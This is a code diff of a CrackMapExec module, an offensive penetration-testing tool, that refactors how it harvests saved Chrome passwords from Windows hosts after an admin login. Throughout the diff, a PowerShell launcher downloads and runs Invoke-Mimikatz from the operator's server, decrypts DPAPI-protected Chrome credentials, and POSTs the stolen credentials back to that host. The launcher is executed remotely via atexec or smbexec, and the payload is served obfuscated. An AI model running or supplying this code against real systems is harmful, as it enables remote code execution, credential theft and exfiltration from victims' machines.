@@ -1,4 +1,4 @@
-from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, gen_random_string, validate_ntlm, write_log
+from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, validate_ntlm, write_log
 from datetime import datetime
 from StringIO import StringIO
 import re
@@ -13,13 +13,14 @@ class CMEModule:
 
     description = "Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords"
 
+    chain_support = False
+
     def options(self, context, module_options):
         '''
         '''
+        return
 
-        self.obfs_name = gen_random_string()
-
-    def on_admin_login(self, context, connection):
+    def launcher(self, context, command):
 
         '''
             Oook.. Think my heads going to explode
@@ -30,7 +31,7 @@ class CMEModule:
             As far as I can figure out there is no way around this, hence we have to first copy Chrome's database to a path without any spaces and then decrypt the entries with Mimikatz
         '''
         
-        payload = '''
+        launcher = '''
         $cmd = "privilege::debug sekurlsa::dpapi"
         $userdirs = get-childitem "$Env:SystemDrive\Users"
         foreach ($dir in $userdirs) {{
@@ -47,7 +48,7 @@ class CMEModule:
         $cmd = $cmd + " exit"
 
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Mimikatz.ps1');
-        $creds = Invoke-{func_name} -Command $cmd;
+        $creds = Invoke-Mimikatz -Command $cmd;
         $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
         $request.Method = 'POST';
         $request.ContentType = 'application/x-www-form-urlencoded';
@@ -58,15 +59,19 @@ class CMEModule:
         $requestStream.Close();
         $request.GetResponse();'''.format(server=context.server, 
                                           port=context.server_port, 
-                                          addr=context.localip,
-                                          func_name=self.obfs_name)
+                                          addr=context.localip)
 
-        context.log.debug('Payload: {}'.format(payload))
-        payload = create_ps_command(payload)
-        connection.execute(payload, methods=['atexec', 'smbexec'])
-        context.log.success('Executed payload')
+        return create_ps_command(launcher)
 
-    def on_request(self, context, request):
+    def payload(self, context, command):
+        with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
+            return obfs_ps_script(ps_script.read())
+
+    def on_admin_login(self, context, connection, launcher, payload):
+        connection.execute(launcher, methods=['atexec', 'smbexec'])
+        context.log.success('Executed launcher')
+
+    def on_request(self, context, request, launcher, payload):
         if 'Invoke-Mimikatz.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
@@ -79,9 +84,7 @@ class CMEModule:
             Here we call the updated PowerShell script instead of PowerSploits version
             '''
 
-            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
-                request.wfile.write(ps_script)
+            request.wfile.write(payload)
 
         else:
             request.send_response(404)
